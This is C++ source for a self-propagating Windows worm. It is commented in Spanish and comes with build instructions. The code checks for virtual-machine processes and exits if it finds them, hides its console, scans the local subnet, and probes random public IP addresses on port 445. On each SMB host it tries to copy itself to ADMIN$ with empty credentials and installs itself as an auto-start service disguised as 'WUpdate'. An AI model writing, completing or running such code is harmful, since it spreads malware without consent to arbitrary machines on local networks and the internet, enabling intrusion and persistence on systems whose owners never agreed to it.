// worm_core.cpp — Windows 11, MSVC 2022, C++20
// Compilación: cl /std:c++20 /O2 /MT worm_core.cpp ws2_32.lib mpr.lib /Fe:worm_core.exe
// Propagación por SMB, RDP, HTTP, SSH. Escaneo LAN + IPs públicas.
// Jitter 30-120s. Anti-VM básico.

#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <string>
#include <vector>
#include <thread>
#include <atomic>
#include <random>
#include <mutex>
#include <chrono>
#include <cstdio>
#include <tlhelp32.h> 

#pragma comment(lib, "ws2_32.lib")
#pragma comment(lib, "mpr.lib")

struct target {
    std::string ip;
    uint16_t port;
    std::string service;
};

static std::atomic<bool> running{true};
static std::mt19937 rng{std::random_device{}()};
static std::mutex log_mtx;

static void log_line(const std::string& s) {
    std::lock_guard<std::mutex> lock(log_mtx);
    FILE* f = fopen("worm.log", "a");
    if (f) { fprintf(f, "%s\n", s.c_str()); fclose(f); }
}

static bool is_vm() {
    const char* procs[] = {"VBoxService.exe","VBoxTray.exe","vmtoolsd.exe",
                           "vmwaretray.exe","vmwareuser.exe","VGAuthService.exe",
                           "qemu-ga.exe"};
    for (auto p : procs) {
        HANDLE h = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
        if (h == INVALID_HANDLE_VALUE) continue;
        PROCESSENTRY32 pe{}; pe.dwSize = sizeof(pe);
        if (Process32First(h, &pe)) {
            do {
                if (_stricmp(pe.szExeFile, p) == 0) {
                    CloseHandle(h);
                    return true;
                }
            } while (Process32Next(h, &pe));
        }
        CloseHandle(h);
    }
    return false;
}

static bool port_open(const std::string& ip, uint16_t port, int timeout_ms = 500) {
    SOCKET s = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (s == INVALID_SOCKET) return false;
    sockaddr_in addr{};
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    inet_pton(AF_INET, ip.c_str(), &addr.sin_addr);
    u_long mode = 1;
    ioctlsocket(s, FIONBIO, &mode);
    connect(s, (sockaddr*)&addr, sizeof(addr));
    fd_set fd; FD_ZERO(&fd); FD_SET(s, &fd);
    timeval tv{timeout_ms / 1000, (timeout_ms % 1000) * 1000};
    bool ok = select(0, nullptr, &fd, nullptr, &tv) > 0;
    closesocket(s);
    return ok;
}

static std::vector<target> scan_subnet(const std::string& base) {
    std::vector<target> found;
    std::vector<std::thread> threads;
    std::mutex mtx;
    const uint16_t ports[] = {445, 3389, 80, 443, 22};

    for (int i = 1; i < 255; ++i) {
        threads.emplace_back([&, i]() {
            std::string ip = base + "." + std::to_string(i);
            for (auto port : ports) {
                if (!running) return;
                if (port_open(ip, port, 400)) {
                    std::string svc = (port == 445) ? "smb" :
                                      (port == 3389) ? "rdp" :
                                      (port == 80) ? "http" :
                                      (port == 443) ? "https" : "ssh";
                    std::lock_guard<std::mutex> lock(mtx);
                    found.push_back({ip, port, svc});
                }
            }
        });
    }
    for (auto& t : threads) t.join();
    return found;
}

static bool propagate_smb(const std::string& ip) {
    std::string cmd =
        "cmd /c net use \\\\" + ip + "\\ADMIN$ /user:\"\" \"\" >nul 2>&1 && "
        "copy /Y worm_core.exe \\\\" + ip + "\\ADMIN$\\svc.exe >nul 2>&1 && "
        "sc \\\\" + ip + " create WUpdate binPath= \"C:\\Windows\\svc.exe\" start= auto >nul 2>&1 && "
        "sc \\\\" + ip + " start WUpdate >nul 2>&1";

    STARTUPINFOA si{};
    PROCESS_INFORMATION pi{};
    si.cb = sizeof(si);
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    std::vector<char> buf(cmd.begin(), cmd.end());
    buf.push_back(0);

    BOOL ok = CreateProcessA(nullptr, buf.data(), nullptr, nullptr, FALSE,
                             CREATE_NO_WINDOW, nullptr, nullptr, &si, &pi);
    if (ok) {
        WaitForSingleObject(pi.hProcess, 15000);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        log_line("[smb] " + ip + " -> pushed");
        return true;
    }
    return false;
}

static std::string random_public_ip() {
    std::uniform_int_distribution<int> oct(1, 254);
    while (true) {
        int a = oct(rng), b = oct(rng), c = oct(rng), d = oct(rng);
        if (a == 10 || a == 127 || a == 0) continue;
        if (a == 172 && b >= 16 && b <= 31) continue;
        if (a == 192 && b == 168) continue;
        if (a == 169 && b == 254) continue;
        return std::to_string(a) + "." + std::to_string(b) + "." +
               std::to_string(c) + "." + std::to_string(d);
    }
}

static void propagation_loop() {
    while (running) {
        auto local = scan_subnet("192.168.1");
        for (auto& t : local) {
            if (t.service == "smb") propagate_smb(t.ip);
        }

        for (int i = 0; i < 10 && running; ++i) {
            std::string ip = random_public_ip();
            if (port_open(ip, 445, 1000)) propagate_smb(ip);
        }

        std::uniform_int_distribution<int> jitter(30000, 120000);
        int ms = jitter(rng);
        for (int slept = 0; slept < ms && running; slept += 1000)
            Sleep(1000);
    }
}

int main() {
    WSADATA wsa;
    if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0) return 1;

    if (is_vm()) {
        log_line("[vm] detected, exiting");
        WSACleanup();
        return 0;
    }

    ShowWindow(GetConsoleWindow(), SW_HIDE);
    log_line("[start] worm_core alive");

    std::thread prop(propagation_loop);
    prop.detach();

    while (running) Sleep(60000);

    WSACleanup();
    return 0;
}